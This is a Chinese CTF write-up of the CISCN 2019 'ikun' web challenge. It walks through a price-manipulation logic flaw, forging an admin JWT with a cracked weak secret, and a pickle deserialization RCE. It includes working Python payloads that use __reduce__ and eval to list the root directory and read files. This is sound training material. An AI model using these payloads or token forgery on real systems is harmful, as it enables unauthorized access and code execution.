---
title: CISCN2019 - Web - ikun
date: 2026-11-14 18:39:00
categories:
  - CTF
  - CISCN2019
  - Web
tags:
  - 逻辑漏洞
  - JWT伪造
  - pickle反序列化
  - RCE
cover: /img/cover/girl-wading-rainy-street.jpg
description: CISCN2019 Web 题，串联逻辑漏洞、JWT 伪造与 pickle 反序列化 RCE：改 discount 低价购买 LV6 商品，爆破 HS256 弱密钥伪造 admin 后 reduce 构造 pickle 读 flag。
keywords:
  - ikun
  - 逻辑漏洞
  - JWT
  - pickle
  - Python2
ai: >-
  本题是 CISCN 2019 华北赛区的 Web 综合题 ikun，背景是一个应援团商城，目标是买到 LV6 商品进入后台最终 RCE 读 flag。第一步写爬虫遍历商品分页，依据 lv6 图标定位到第 180 页、ID 1624 的高价商品；余额远不足，于是审计结算逻辑发现折扣 discount 作为前端可控参数，后端仅校验其落在 0 到 1 之间却未限制下限，把 discount 改成极小值即可几乎零成本购买 LV6，跳转至仅 admin 可访问页面。第二步登录后 Cookie 携带 HS256 的 JWT，爆破得到弱密钥 1Kun，用其伪造 username 为 admin 的令牌进入管理后台。第三步从后台源码包下载链接审计出 Admin.py，become 参数经 unquote 后直接送进 pickle.loads 且结果回显，靶机为 Python 2 需 protocol 0，利用 __reduce__ 返回 eval 读文件即可命令执行，先列根目录确认 flag 位置再读取。全题依次考查业务逻辑漏洞、JWT 弱密钥与反序列化利用链。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CISCN 2019 华北赛区 Day1 Web2 |
| 方向 | Web |
| 难度 | 中等 |
| 环境 | 授权靶场（已脱敏） |

考点：逻辑漏洞（薅羊毛）、JWT 伪造、Python pickle 反序列化 RCE。

题目背景：首页是一个 ikun 商城（KunKun 应援团），提示「ikun 们冲，一定要买到 lv6!!!」。目标是买到 LV6 商品，进而进入 admin 后台，最终 RCE 读 flag。

## 信息收集

### 定位 LV6 商品

商城分页展示商品，LV6 商品在第 180 页。写爬虫遍历 `/shop?page=N`，匹配 `lv/lv6.png` 图标：

```python
import requests
for page in range(1, 500):
    r = requests.get(f"http://target:8080/shop?page={page}")
    if "lv/lv6.png" in r.text:
        print(page)
        break
```

结果：第 180 页，商品 ID 1624，名称 `b*sh*`，价格 `1145141919.0`。

## 漏洞分析

### 逻辑漏洞：改 discount 参数薅羊毛

余额只有 1000，而 LV6 价格高达 1145141919.0。购买流程分两步：

1. **加入购物车**：POST `/shopcar/add`，参数 `_xsrf` + `id=1624`
2. **结算**：访问 `/shopcar` 获取结算表单，其中有隐藏字段 `discount=0.8`（优惠券 -20%）

关键在 `Shop.py` 源码的 `ShopCarHandler.post`：

```python
discount = float(self.get_argument('discount'))  # 默认 1
if commodity.amount <= 0 or discount <= 0 or discount > 1 \
        or user.integral < float(commodity.price) * discount:
    return danger=1  # 失败
else:
    # 成功购买
    if commodity.name == 'b*sh*':
        return self.redirect('/b1g_m4mber')
```

后端只校验 `0 < discount <= 1`，把 `discount` 改成极小值即可超低价购买：

```python
# POST /shopcar（注意 action=""，提交到 /shopcar 而非 /pay）
data = {
    "_xsrf": xsrf,
    "id": "1624",
    "price": "1145141919.0",
    "discount": "0.00000000001",  # 极小折扣
}
```

购买成功后（余额只扣约 0.011 元），跳转 `/b1g_m4mber`，提示「该页面，只允许 admin 访问」。

### JWT 伪造

登录后 Cookie 中有 `JWT`（HS256），payload 为 `{"username": "xxx"}`。爆破密钥得到 `1Kun`（源码 settings.py 中也确认 `jwt_secret = '1Kun'`）。

用密钥 `1Kun` 伪造 admin JWT：

```text
header:    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
payload:   eyJ1c2VybmFtZSI6ImFkbWluIn0
signature: 40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

完整 JWT（脱敏省略）：

```text
eyJhbG…ynjo
```

用伪造 JWT 访问 `/b1g_m4mber`，进入 admin 后台。

### Python pickle 反序列化 RCE

admin 后台页面源码中发现源码包下载链接 `/static/asd1f654e683wq/www.zip`。下载后审计 `sshop/views/Admin.py`：

```python
class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))  # 反序列化点
            return self.render('form.html', res=p, member=1)  # 结果回显
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

`become` 参数经过 `urllib.unquote` 解码后直接 `pickle.loads`，结果回显到页面。靶机是 **Python 2**（`urllib.unquote`、`print str(ex)`），需用 protocol 0 格式构造 payload。

利用 `__reduce__` 魔术方法执行 `eval` 读文件：

```python
import pickle
import urllib.parse

class Payload(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))

payload = urllib.parse.quote(pickle.dumps(Payload(), protocol=0))
```

先探测根目录 `str(__import__('os').listdir('/'))`，确认 flag 在 `/flag.txt`，最终读得 flag。

## 利用过程

1. 爬虫遍历分页，定位第 180 页 LV6 商品（ID 1624）。
2. 加入购物车后结算，把 `discount` 改为 `0.00000000001`，超低价购买 LV6，跳转 `/b1g_m4mber`。
3. 爆破 HS256 密钥为 `1Kun`，伪造 admin JWT 进入后台。
4. 下载 `www.zip` 审计出 pickle 反序列化点，构造 `__reduce__` payload 经 `become` 提交。
5. 先列根目录确认 flag 路径，再 eval 读取 `/flag.txt`。

## 完整 EXP

> 归档 payload（脱敏后重组）。

```text
# 1. 搜索 LV6（第 180 页，ID 1624）
# 2. 改 discount 超低价购买
#    POST /shopcar/add   params: _xsrf, id=1624
#    POST /shopcar       params: _xsrf, id=1624, price=1145141919.0, discount=0.00000000001
# 3. 伪造 admin JWT（密钥 1Kun）
# 4. pickle 反序列化 RCE 读 flag
```

Python exp：

```python
# -*- coding: utf-8 -*-
import pickle
import urllib.parse

# ============ 3. 伪造 admin JWT（密钥 1Kun） ============
admin_jwt = "eyJhbG…ynjo"

# ============ 4. pickle RCE 读 flag ============
class ReadFlag(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))

# 靶机是 Python 2，用 protocol 0
payload = urllib.parse.quote(pickle.dumps(ReadFlag(), protocol=0))
print("become 参数:", payload)

# 探测根目录版本
class ListDir(object):
    def __reduce__(self):
        return (eval, ("str(__import__('os').listdir('/'))",))
probe = urllib.parse.quote(pickle.dumps(ListDir(), protocol=0))
print("探测 payload:", probe)

# 提交方式：
#   POST /b1g_m4mber
#   Cookie: JWT=<admin_jwt>
#   params: _xsrf=<从页面获取>, become=<payload>
```

> 原归档末尾含真实 flag，已脱敏移除。

## Flag

脱敏后：`flag{xxxx}`。原值为 CTF2 格式，经 pickle 反序列化 eval 读取 `/flag.txt` 得到。

## 踩坑与总结

1. **逻辑漏洞**：折扣 `discount` 放在前端，后端仅校验范围 `0 < discount <= 1`，未校验最小值，可薅羊毛。
2. **JWT 伪造**：HS256 弱密钥 `1Kun` 可爆破，伪造 admin 身份实现水平越权。
3. **Python pickle 反序列化**：`pickle.loads` 处理用户输入，`__reduce__` 可 RCE；靶机 Python 2 必须用 protocol 0。
4. 搜索 LV6 用图标名 `lv/lv6.png` 做特征匹配，比价格判断更稳。
5. 反序列化结果会回显到页面，先 `listdir('/')` 探测 flag 路径再读文件更可靠。
